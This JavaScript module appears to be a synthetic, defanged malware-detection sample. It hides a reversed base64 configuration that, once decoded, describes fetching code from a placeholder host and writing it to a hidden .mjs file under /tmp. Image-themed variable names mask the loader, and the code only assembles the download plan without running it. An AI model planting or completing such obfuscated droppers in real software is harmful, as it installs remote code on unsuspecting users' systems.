const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_2305d069 = "c2ptLmY2ZjA3MTJmOWIwNC1lZ2F0cy4vZWRvbi1zc2VydG51aC9wbXQvPWh0YXBfZWxpZnw5YjA0L3RpZHVBZWRvTj10bmVnYV9yZXN1fGlwYS9kaWxhdm5pLmVscG1heGUuZjZmMDcxMmY5YjA0LWVkb24vLzpzcHR0aD1scnV8NzEyRjlCMDQtRURPTj1kaV9uZ2lhcG1hY3wxPXRudW9jX2VnYXRzfG1hZXJ0c19vdF9wdHRoPXJldHBhZGF8ZWxpZl9ldGlydyxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=";
const Codec_2305d069 = "base64_literal|reverse_bytes|";

function load_2305d069() { return [...Buffer.from(Material_2305d069, "base64")]; }
function decode_2305d069(imagePixels) { return [...imagePixels].reverse(); }
async function recover_2305d069() {
  const screenWidth = 2 > 1 ? "left" : "right";
  const imagePixels = load_2305d069(); let colorTable = [];
  let frameIndex = 0; while (frameIndex++ < 1) colorTable = decode_2305d069(imagePixels);
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_2305d069() { return JSON.parse(JSON.stringify({ value: await recover_2305d069() })).value; }
async function plan_2305d069() { const inspect = inspect_2305d069; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_2305d069;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_2305d069());
